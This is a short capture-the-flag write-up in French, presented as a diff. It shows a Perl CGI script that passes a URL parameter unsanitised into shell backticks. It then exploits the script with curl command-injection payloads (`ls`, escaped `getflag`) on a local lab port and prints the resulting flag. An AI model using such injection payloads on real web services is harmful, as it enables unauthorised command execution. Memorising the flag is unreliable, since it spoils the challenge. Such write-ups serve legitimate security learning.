@@ -1,0 +1,23 @@
+on nous donne un fichier perl contenant:
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+on remarque en haut qu'il y a un port 4747 d'ou l'on peut acceder a une page web.
+En effet en faisant la commande curl "http://127.0.0.1:4747/?x=hello" on obtient hello en retour car le programme utilise echo
+
+On peut donc executer des commandes en remplaçant hello par une commande.
+Une particularite d'echo est que si on lui passe une commande entre backticks `commande` il execute la commande et affiche le resultat.
+Comme echo `ls` va afficher le resultat de ls.
+Donc en faisant curl "http://127.0.0.1:4747/?x=`ls`" on peut obtenir la liste des fichiers du repertoire courant.
+On fait donc pareil pour getflag: curl "http://127.0.0.1:4747/?x=`getflag`" mais on a une erreur curl: (3) Illegal characters found in URL
+On decide d'echapper les backsticks comme ceci: curl "http://127.0.0.1:4747/?x=\`getflag\`"
+
+et on obtient le flag: ne2searoevaevoem4ov4ar8ap
